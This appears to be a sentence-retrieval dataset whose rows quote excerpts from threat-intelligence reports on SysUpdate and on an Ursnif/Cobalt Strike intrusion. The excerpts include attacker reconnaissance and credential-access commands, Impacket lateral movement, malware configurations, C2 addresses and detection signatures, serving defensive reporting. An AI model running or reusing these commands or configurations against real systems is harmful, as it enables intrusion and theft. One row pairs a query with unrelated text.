the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.|0.9261996929463543|['This is because the random number changes every time, but the end is the same 0x2191 result.', 'This explains why the first DNS request always ends with reeaaaaaa.<c&c domain>.', 'If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further commands and sends information about the infected machine.', 'Interestingly, the code related to this DNS C&C communication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.', 'We continue monitoring this group and malware family for updates on possible variations of C&C communication protocols being abused.', 'In all versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.', 'Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path 4/9Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.', 'Configuration structure Length (in Field content Comment Example bytes) Header 4 We only found one value 0x00000001 {89D0E853-FA08- GUID 38 Follows the Microsoft format 4f94-A5FE- A90E6869E074} Size of the C&C section 4 0x00000018 Size of the next C&C domain 4 0x00000014 name and port 0x01 = regular C&C C&C type 1 0x05 = DNS tunneling 0x01 0x00 = regular C&C C&C domain name Variable dev.gitlabs.me Port number 4 0x00000050 Next section contains all the Size of next section 4 hardcoded names (folder, files, 0x00000034 registry values) Name of the hardcoded directory where files are Variable The folder is located either in % gtdcfp copied Name of the executable Variable TextInputHost.exe vulnerable to side loading Name of the malicious side- Variable rc.dll loaded DLL Name of the binary file containing the encoded Variable rc.bin Stage 1 Name of the service or registry key value used for Variable gtdcfp persistence We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.', 'We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.', 'Interestingly, all the samples of this new version had a domain name as its C&C.', 'In the previous version of SysUpdate, the group used hardcoded IP addresses as C&C.']
the malware retrieves information on the infected machine and sends it to the C&C|0.7603602422544614|['This is because the random number changes every time, but the end is the same 0x2191 result.', 'This explains why the first DNS request always ends with reeaaaaaa.<c&c domain>.', 'If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further commands and sends information about the infected machine.', 'Interestingly, the code related to this DNS C&C communication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.', 'We continue monitoring this group and malware family for updates on possible variations of C&C communication protocols being abused.', 'In all versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.', 'Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path 4/9Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.', 'Configuration structure Length (in Field content Comment Example bytes) Header 4 We only found one value 0x00000001 {89D0E853-FA08- GUID 38 Follows the Microsoft format 4f94-A5FE- A90E6869E074} Size of the C&C section 4 0x00000018 Size of the next C&C domain 4 0x00000014 name and port 0x01 = regular C&C C&C type 1 0x05 = DNS tunneling 0x01 0x00 = regular C&C C&C domain name Variable dev.gitlabs.me Port number 4 0x00000050 Next section contains all the Size of next section 4 hardcoded names (folder, files, 0x00000034 registry values) Name of the hardcoded directory where files are Variable The folder is located either in % gtdcfp copied Name of the executable Variable TextInputHost.exe vulnerable to side loading Name of the malicious side- Variable rc.dll loaded DLL Name of the binary file containing the encoded Variable rc.bin Stage 1 Name of the service or registry key value used for Variable gtdcfp persistence We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.', 'We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.', 'Interestingly, all the samples of this new version had a domain name as its C&C.', 'In the previous version of SysUpdate, the group used hardcoded IP addresses as C&C.']
Then, the malware retrieves information on the compromised computer and sends it to the C&C.|1.0000000000000002|['It is possible that the developer made use of the Asio library because of its portability across multiple platforms.', 'Some parameters can be passed to the binary (note that Boolean refers to Boolean data that is sent to the C&C): Table 3.', 'Parameters passed to the binary as observed from Linux SysUpdate samples Parameter Effect -launch Sets persistence, zeroes boolean, and exits -run Zeroes boolean and continues -x Daemonize the process, zeroes boolean, and continues -i Daemonize the process, zeroes boolean, sets persistence, and continues -f <guid> Sets the GUID to <guid> and continues The persistence is ensured by copying a script similarly named as the current filename to the /usr/lib/systemd/system/ directory, and creating a symlink to this file in the /etc/ystem/system/multi- user.target.wants/ directory.', 'Thus, this method only works if the current process has root privileges.', 'The content of the script is: [Unit] Description=xxx [Service] Type=forking ExecStart=<path to current file> -x ExecStop=/usr/bin/id [Install] WantedBy=multi-user.target After running the code dependent on the parameters, if the operator has not chosen a GUID with the -f parameter, the malware generates a random GUID and writes it to a file similarly named as the current file, with a d appended to it.', 'Then, the malware retrieves information on the compromised computer and sends it to the C&C.', 'The following information is sent to the C&C, encrypted with a hardcoded key and DES CBC algorithm: GUID Host name Username Local IP address and port used to send the request Current PID Kernel version and machine architecture Current file path Boolean (0 if it was launched with exactly one parameter, 1 otherwise) 6/9For the DNS C&C communication version, the malware retrieves the configured DNS server by reading the content of the /etc/resolv.conf file, or uses the DNS server operated by Google at IP address 8.8.8.8.', 'In 2022, we already noticed that this threat actor was interested in platforms other than Windows, with the rshell malware family running on Linux and Mac OS.', 'For these reasons, we would not be surprised to see SysUpdate samples for the Mac OS platform in the future.', 'Interestingly, most of the Linux samples we found used the new DNS tunneling feature we detailed in Figure 2, while only one of the Windows samples used it.', 'Certificate compromise Another interesting part of this campaign is the fact that some of the malicious files are signed with a certificate with the following signer: Permyakov Ivan Yurievich IP.']
used as a lure to entice the victim into opening the malicious file.|0.8102016412474546|['However, the legitimate files are signed with a Xinda.im certificate instead of the stolen VMProtect certificate.', 'Figure 3.', 'Comparing the properties of the malicious file (left), and properties of the legitimate Youdu installer (right) As seen in the product name identified in the malicious files properties, we searched for possible products named i Talk but did not find any that could be related to this investigation.', 'However, we found traces of files from the legitimate Youdu chat application signed by Xinda.im being copied to folders named i Talk on one victims computer.', 'This suggests that some chat application named i Talk might be repackaging components from the official Youdu client along with malicious executables.', 'It appears that a chat application was used as a lure to entice the victim into opening the malicious file.', 'This would be consistent with the tactics, techniques, and procedures (TTPs) of two previous Iron Tiger campaigns from 2020 and 2021: a documented compromise of a chat application widely used by the Mongolian government, and a supply chain attack on Mimi chat, a chat application used in parts of South East Asia.', 'Post-exploitation tools We found a custom Chrome password and cookie grabber that appeared unfamiliar, and it was compiled and uploaded in September 2022.', 'The file was also signed with the VMProtect certificate but it was not obfuscated.', 'In general, the features were simple; the malware decrypts the saved passwords to a file named passwords.txt, and the cookies to a file named cookies.txt.', 'Analyzing its details, the malware first parses the Local State file to retrieve the AES key used to encrypt the cookies and passwords.']
We observed a process created by Cobalt Strike accessing lsass.exe|0.9999999999999999|"['We observed a process created by Cobalt Strike accessing lsass.exe.', 'The GrantedAccess code of0x1010is a known indicator of such tools as Mimikatz.', 'This was observed on both the beachhead host and a domain controller.LogName=Microsoft-Windows-Sysmon/Operational EventCode=10 EventType=4 ComputerName=<REDACTED> User=SYSTEM Sid=S-1-5-18 SidType=1 SourceName=Microsoft-Windows-Sysmon Type=Information RecordNumber=765707 Keywords=None TaskCategory=Process accessed (rule: ProcessAccess) OpCode=Info Message=Process accessed: RuleName: technique_id=T1003,technique_name=Credential Dumping UtcTime: <REDACTED> SourceProcessGUID: {aaadb608-97b2-630c-6750-000000000400} SourceProcessId: 4768 SourceThreadId: 4248 SourceImage: C:\\\\Windows\\\\system32\\\\rundll32.exe TargetProcessGUID: {aaadb608-45a2-62fc-0c00-000000000400} TargetProcessId: 672 TargetImage: C:\\\\Windows\\\\system32\\\\lsass.exe GrantedAccess: 0x1010 CallTrace: C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9fc24|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+20d0e|UNKNOWN(000002AA74CFD95C)Ursnif related discoveryAs we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment.', 'The following commands were executed and their standard output was redirected to append to a file in the users %APPDATA%\\\\Local\\\\Temp\\\\cmd /C ""wmic computersystem get domain |more > C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""systeminfo.exe > C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""net view >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""nslookup 127.0.0.1 >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""tasklist.exe /SVC >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""driverquery.exe >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""reg.exe query ""HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall"" /s >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""nltest /domain_trusts >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""net config workstation >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""nltest /domain_trusts >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""nltest /domain_trusts /all_trusts >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""net view /all /domain >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""net view /all >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1"" cmd /C ""echo -------- >> C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\Temp\\\\BD2C.bin1""Manual discoveryOnce the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands:whoami whoami /groups time ipconfig /all systeminfoThe threat actor quickly took interest in a support account.', 'This account belonged to the Domain Admin group.net user <REDACTED>The threat actor also used a batch script to collect a list of all computer objects on the domain usingC:\\\\Windows\\\\system32\\\\cmd.exe /C adcomp.batwhich contained the PowerShell command:powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txtDuring the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the/4command line argument.C:\\\\Windows\\\\system32\\\\taskmgr.exe /4WMI was used to pivot to a domain controller on the network.', 'The actor leveraged Impacketswmiexec.pyto execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.The commands executed included directory traversal, host discovery, and execution of tools on the DC.A breakdown of the parent and child processes invoked:The command can be broken down as follows:Q indicates turn off echo no response.C indicates to stop after command execution.The 127.0.01 and ADMIN$ indicates C:\\\\Windows.Output is achieved via the parameter 2>&1, to redirect errors and output to one file:This command line closely resembles the code within thewmiexec.pyas part of the Impacket tool maintained by Fortra.As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets:The use of Impacket by threat actors has been recently detailed by CISA in alertAA22-277A Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.The Impacket process hierarchy in this case can be visualized as:At the network level, commands are issued by DCOM/RPC port 135, with responses by SMB using port 445.']"
whoami /groups|0.8688756151045635|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
The threat actor was able to RDP to a backup server using the admin credentials they acquired.|0.8172011092241436|"['We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.Correlating the network activity to the host activity confirms that the Powershell.exe process initiated the WMI requests.The destination port is within the ephemeral port range 4915265535, which is for short-lived, time based, communications RFC 6335.13Cubed(Richard Davis) also released an amazing resource to investigate Impacket related incidents here:https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdfOne of the observed commands invoked via WMI was firefox.exe.This was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands.The process generated a significant volume of network connections to 193.201.9[.', ']199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon.UrsnifUrsnif was seen using the following domains and IPs:5.42.199.83superliner.top \t62.173.149.7 internetlines.in \t31.41.44.97 superstarts.top \t31.41.44.27\t superlinez.top \t31.41.44.27\t internetlined.com \t208.91.197.91 denterdrigx.com: \t187.190.48.135 \t210.92.250.133 \t189.143.170.233 \t201.103.222.246 \t151.251.24.5 \t190.147.189.122 \t115.88.24.202 \t211.40.39.251 \t187.195.146.2 \t186.182.55.44 \t222.232.238.243 \t211.119.84.111 \t51.211.212.188 \t203.91.116.53 \t115.88.24.203 \t190.117.75.91 \t181.197.121.228 \t190.167.61.79 \t109.102.255.230 \t211.119.84.112 \t190.107.133.19 \t185.95.186.58 \t175.120.254.9 \t46.194.108.30 \t190.225.159.63 \t190.140.74.43 \t187.156.56.52 \t195.158.3.162 \t138.36.3.134 \t109.98.58.98 \t24.232.210.245 \t222.236.49.123 \t175.126.109.15 \t124.109.61.160 \t95.107.163.44 \t93.152.141.65 \t5.204.145.65 \t116.121.62.237 \t31.166.129.162 \t222.236.49.124 \t211.171.233.129 \t211.171.233.126 \t211.53.230.67 \t196.200.111.5 \t190.219.54.242 \t190.167.100.154 \t110.14.121.125 \t58.235.189.192 \t37.34.248.24 \t110.14.121.123 \t179.53.93.16 \t175.119.10.231 \t211.59.14.90 \t188.48.64.249 \t187.232.150.225 \t186.7.85.71 \t148.255.20.4 \t91.139.196.113 \t41.41.255.235 \t31.167.236.174 \t189.165.2.131 \t1.248.122.240We also observed several modules for Ursnif downloaded from the following IP:193.106.191.186  3db94cf953886aeb630f1ae616a2ec25 cook32.rar  d99cc31f3415a1337e57b8289ac5011e cook64.rar  a1f634f177f73f112b5356b8ee04ad19 stilak32.rar  8ea6ad3b1acb9e7b2e64d08411af3c9a stilak64.rar  0c5862717f00f28473c39b9cba2953f4 vnc32.rar  ce77f575cc4406b76c68475cb3693e14 vnc64.rarJoeSandbox reported this sample having the following configuration:{  ""RSA Public Key"": ""WzgHg0uTPZvhLtnG19qpIk+GmHzcoxkfTefSu6gst5n3mxnOBivzR4MH4a6Ax7hZ5fgcuPGt3NKKPbYTwmknjD2zYXaAp3+wR0kAZI+LVG1CUiDgK2lhHKV91eobjLR/Z/RtHa+MZM10+zZoBGCk+VjMy7gWkzoCrrhs6/Bft/lYT9NzAGBQ4ZZgJTkXW4tVgEQiGmoc7Ta1/NqrbaQBEciYTW7E4egMKHQeGNrjd94u5PZha7GgX7aseTe7/68QIz2hc7Xl2gtUGQYYVqKgGpKjKrQT5jpYbcjLE+VoRjcWucFAPAfIryWH1A4T+PbO5+eHGGCIM/fAuYU/58JZn0HUmtKm9wHYCUJ/uGotKAI="",  ""c2_domain"": [   ""superliner.top"",   ""superlinez.top"",   ""internetlined.com"",   ""internetlines.in"",   ""medialists.su"",   ""medialists.ru"",   ""mediawagi.info"",   ""mediawagi.ru"",   ""5.42.199.83"",   ""denterdrigx.com"",   """",   ""digserchx.at""  ],  ""ip_check_url"": [   ""http://ipinfo.io/ip"",   ""http://curlmyip.net""  ],  ""serpent_key"": ""Jv1GYc8A8hCBIeVD"",  ""tor32_dll"": ""file://c:\\\\\\\\test\\\\\\\\test32.dll"",  ""tor64_dll"": ""file://c:\\\\\\\\test\\\\\\\\tor64.dll"",  ""server"": ""50"",  ""sleep_time"": ""1"",  ""SetWaitableTimer_value(CRC_CONFIGTIMEOUT)"": ""60"",  ""time_value"": ""60"",  ""SetWaitableTimer_value(CRC_TASKTIMEOUT)"": ""60"",  ""SetWaitableTimer_value(CRC_SENDTIMEOUT)"": ""300"",  ""SetWaitableTimer_value(CRC_KNOCKERTIMEOUT)"": ""60"",  ""not_use(CRC_BCTIMEOUT)"": ""10"",  ""botnet"": ""3000"",  ""SetWaitableTimer_value"": ""1"" }Pivoting on domains registered in WHOIS with the email[emailprotected]or organizationRus Lak, reveals many similar domains as seen in this intrusion.Cobalt StrikeThe following Cobalt Strike C2 server was observed:193.201.9.199:443 JA3: 72a589da586844d7f0818ce684948eea JA3s: f176ba63b4d68e576b5ba345bec2c7b7 Certificate: [6e:ce:5e:ce:41:92:68:3d:2d:84:e2:5b:0b:a7:e0:4f:9c:b7:eb:7c] Not Before: 2015/05/20 18:26:24 UTC  Not After: 2025/05/17 18:26:24 UTC  Issuer Org:  Subject Common:  Subject Org:  Public Algorithm: rsaEncryptionThe following Cobalt Strike configuration was observed:{  ""spawnto"": ""AAAAAAAAAAAAAAAAAAAAAA=="",  ""pipename"": null,  ""dns_beacon"": {   ""put_metadata"": null,   ""get_TXT"": null,   ""get_AAAA"": null,   ""get_A"": null,   ""beacon"": null,   ""maxdns"": null,   ""dns_sleep"": null,   ""put_output"": null,   ""dns_idle"": null  },  ""smb_frame_header"": ""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="",  ""post_ex"": {   ""spawnto_x64"": ""%windir%\\\\\\\\sysnative\\\\\\\\rundll32.exe"",   ""spawnto_x86"": ""%windir%\\\\\\\\syswow64\\\\\\\\rundll32.exe""  },  ""stage"": {   ""cleanup"": ""false""  },  ""process_inject"": {   ""stub"": ""IiuPJ9vfuo3dVZ7son6mSA=="",   ""transform_x64"": [],   ""transform_x86"": [],   ""startrwx"": ""true"",   ""min_alloc"": ""0"",   ""userwx"": ""true"",   ""execute"": [    ""CreateThread"",    ""SetThreadContext"",    ""CreateRemoteThread"",    ""RtlCreateUserThread""   ],   ""allocator"": ""VirtualAllocEx""  },  ""uses_cookies"": ""true"",  ""http_post_chunk"": ""0"",  ""ssh"": {   ""privatekey"": null,   ""username"": null,   ""password"": null,   ""port"": null,   ""hostname"": null  },  ""useragent_header"": null,  ""maxgetsize"": ""1048576"",  ""proxy"": {   ""behavior"": ""Use IE settings"",   ""password"": null,   ""username"": null,   ""type"": null  },  ""tcp_frame_header"": ""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="",  ""server"": {   ""publickey"": ""MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="",   ""port"": ""443"",   ""hostname"": ""193.201.9.199""  },  ""beacontype"": [   ""HTTPS""  ],  ""kill_date"": null,  ""license_id"": ""1580103824"",  ""jitter"": ""0"",  ""sleeptime"": ""60000"",  ""http_get"": {   ""server"": {    ""output"": [     ""print""    ]   },   ""client"": {    ""metadata"": [],    ""headers"": []   },   ""verb"": ""GET"",   ""uri"": ""/__utm.gif""  },  ""cfg_caution"": ""false"",  ""host_header"": """",  ""crypto_scheme"": ""0"",  ""http_post"": {   ""client"": {    ""output"": [],    ""id"": [],    ""headers"": []   },   ""verb"": ""POST"",   ""uri"": ""/submit.php""  } }Checking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike,83cd09b0f73c909bfc14883163a649e1d207df22.Atera & SplashTopEven though the threat actor installed these agents, we did not observe any activity with these tools.Several HTTP Post events were observed to the identified domains denterdrigx[.', ']com, superliner[.', ']top and 5.42.199[.', ']83, masquerading as image uploads.The user agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64), an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).The POST event included a MIME part indicating file upload activityThe example HTTP stream containing the contentThe file that was uploaded 775E.bin was deleted by the injected Explorer.exe process from the target endpoint in folder \\\\Users\\\\<REDACTED>\\\\AppData\\\\Local\\\\TempThe exfiltration activity along with the beacon activity can be detected using the following network signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif Variant CnC Beacon.', 'In this example, the mix of activity can be observed as:The threat actor was able to RDP to a backup server using the admin credentials they acquired.', 'Using the logs inMicrosoft-Windows-TerminalServices-LocalSessionManager/Operationalwe were able to determine the threat actor spent approximately 10 minutes on the backup server before disconnecting their RDP session.', 'By doing this, they revealed the workstation name of the client:WIN-RRRU9REOK18.LogName=Security EventCode=4624 EventType=0 ComputerName=<REDACTED> SourceName=Microsoft Windows security auditing.', 'Type=Information RecordNumber=300297 Keywords=Audit Success TaskCategory=Logon OpCode=Info Message=An account was successfully logged on.', 'Logon Information: \tLogon Type:\t\t3 \tRestricted Admin Mode:\t- \tVirtual Account:\t\tNo \tElevated Token:\t\tYes Network Information: \tWorkstation Name:\tWIN-RRRU9REOK18 \tSource Network Address:\t<REDACTED> \tSource Port:\t\t0 Detailed Authentication Information: \tLogon Process:\t\tNtLmSsp  \tAuthentication Package:\tNTLM \tTransited Services:\t- \tPackage Name (NTLM only):\tNTLM V2During that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content.Process execution:C:\\\\Program Files\\\\[redacted]\\\\Console\\\\[redacted].exe ""C:\\\\Windows\\\\system32\\\\taskmgr.exe"" /4 ""C:\\\\Windows\\\\system32\\\\NOTEPAD.EXE"" C:\\\\Users\\\\USER\\\\Desktop\\\\New Text Document.txtSysmon Copy Paste Collection EID 24:user: DOMAIN\\\\USER ip: 127.0.0.1 hostname: WIN-RRRU9REOK18AtomicRDP Client Name: WIN-RRRU9REOK18  Ursnif Domains: denterdrigx.com superliner.top internetlines.in superstarts.top superlinez.top internetlined.com  Ursnif IPs: 62.173.149.7 31.41.44.97 5.42.199.83 31.41.44.27\t 208.91.197.91 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 51.211.212.188 203.91.116.53 115.88.24.203 190.117.75.91 181.197.121.228 190.167.61.79 109.102.255.230 211.119.84.112 190.107.133.19 185.95.186.58 175.120.254.9 46.194.108.30 190.225.159.63 190.140.74.43 187.156.56.52 195.158.3.162 138.36.3.134 109.98.58.98 24.232.210.245 222.236.49.123 175.126.109.15 124.109.61.160 95.107.163.44 93.152.141.65 5.204.145.65 116.121.62.237 31.166.129.162 222.236.49.124 211.171.233.129 211.171.233.126 211.53.230.67 196.200.111.5 190.219.54.242 190.167.100.154 110.14.121.125 58.235.189.192 37.34.248.24 110.14.121.123 179.53.93.16 175.119.10.231 211.59.14.90 188.48.64.249 187.232.150.225 186.7.85.71 148.255.20.4 91.139.196.113 41.41.255.235 31.167.236.174 189.165.2.131 1.248.122.240 193.106.191.186   Cobalt Strike: 193.201.9.199Computed3488164.iso f7d85c971e9604cc6d2a2ffcac1ee4a3 67175143196c17f10776bdf5fbf832e50a646824 e999890ce5eb5b456563650145308ae837d940e38aec50d2f02670671d472b99  6570872.lnk c6b605a120e0d3f3cbd146bdbc358834 328afa8338d60202d55191912eea6151f80956d3 16323b3e56a0cbbba742b8d0af8519f53a78c13f9b3473352fcce2d28660cb37  adcomp.bat eb2335e887875619b24b9c48396d4d48 b658ab9ac2453cde5ca82be667040ac94bfcbe2e 4aa4ee8efcf68441808d0055c26a24e5b8f32de89c6a7a0d9b742cce588213ed  alsoOne.bat c03f5e2bc4f2307f6ee68675d2026c82 4ce65da98f0fd0fc4372b97b3e6f8fbeec32deb3 6a9b7c289d7338760dd38d42a9e61d155ae906c14e80a1fed2ec62a4327a4f71  canWell.js 6bb867e53c46aa55a3ae92e425c6df91 6d4f1a9658baccd2e406454b2ad40ca2353916ab 5b51bd2518ad4b9353898ed329f1b2b60f72142f90cd7e37ee42579ee1b645be  firefox.exe 6a4356bd2b70f7bd4a3a1f0e0bfec9a4 485a179756ff9586587f8728e173e7df83b1ffc3 6c5338d84c208b37a4ec5e13baf6e1906bd9669e18006530bf541e1d466ba819  itsIt.db 60375d64a9a496e220b6eb1b63e899b3 d1b2dd93026b83672118940df78a41e2ee02be80 8e570e32acb99abfd0daf62cff13a09eb694ebfa633a365d224aefc6449f97deor.jpg 60ca7723edd4f3a0561ea9d3a42f82b4 87b699122dacf3235303a48c74fa2b7a75397c6b bbcceb987c01024d596c28712e429571f5758f67ba12ccfcae197aadb8ab8051  cook32.rar 3db94cf953886aeb630f1ae616a2ec25 743128253f1df9e0b8ee296cfec17e5fc614f98d 1cdbf7c8a45b753bb5c2ea1c9fb2e53377d07a3c84eb29a1b15cdc140837f654  cook64.rar d99cc31f3415a1337e57b8289ac5011e f67ce90f66f6721c3eea30581334457d6da23aac b94810947c33a0a0dcd79743a8db049b8e45e73ca25c9bfbf4bfed364715791b  stilak32.rar a1f634f177f73f112b5356b8ee04ad19 7c82b558a691834caf978621f288af0449400e03 c77ea4ad228ecad750fb7d4404adc06d7a28dbb6a5e0cf1448c694d692598f4f  stilak64.rar 8ea6ad3b1acb9e7b2e64d08411af3c9a 7c04c4567b77981d0d97d8c2eb4ebd1a24053f48 dfdfd0a339fe03549b2475811b106866d035954e9bc002f20b0f69e0f986838f  vnc32.rar 0c5862717f00f28473c39b9cba2953f4 25832c23319fcfe92cde3d443cc731ac056a964a 7ebd70819a79be55d4c92c66e74e90e3309ec977934920aee22cd8d922808c9d  vnc64.rar ce77f575cc4406b76c68475cb3693e14 80fdc4712ae450cfa41a37a24ce0129eff469fb7 f02dc60872f5a9c2fcc9beb05294b57ad8a4a9cef0161ebe008NetworkPotential Impacket wmiexec.py activityET MALWARE Ursnif Variant CnC Beacon ET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F) ET INFO HTTP Request to a *.top domain ET DNS Query to a *.top domain - Likely Hostile ET MALWARE Ursnif Variant CnC Data Exfil ET INFO Dotted Quad Host RAR Request ET MALWARE Meterpreter or Other Reverse Shell SSL Cert ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike ET POLICY RDP connection confirm ET POLICY MS Remote Desktop Administrator Login Request ET MALWARE Ursnif Variant CnC Beacon 3 ET MALWARE Ursnif Payload Request (cook32.rar) ET MALWARE Ursnif Payload Request (cook64.rar) ET INFO Splashtop Domain (splashtop .com) in TLS SNI ET INFO Splashtop Domain in DNS Lookup (splashtop .com)SigmaYaraMITREMshta - T1218.005 Visual Basic - T1059.005 Compile After Delivery - T1027.004 BITS Jobs - T1197 Credentials from Password Stores - T1555 LSASS Memory - T1003.001 System Information Discovery - T1082 Process Discovery - T1057 Domain Trust Discovery - T1482 Mark-of-the-Web Bypass - T1553.005 Malicious File - T1204.002 System Time Discovery - T1124 System Owner/User Discovery - T1033 Remote System Discovery - T1018 Remote Desktop Protocol - T1021.001 Windows Management Instrumentation - T1047 Domain Account - T1087.002 Process Injection - T1055 Asynchronous Procedure Call - T1055.004 Registry Run Keys / Startup Folder - T1547.001 Remote Access Software - T1219 Web Protocols - T1071.001 Lateral Tool Transfer - T1570 Exfiltration Over C2 Channel - T1041Internal case #17386Related']"
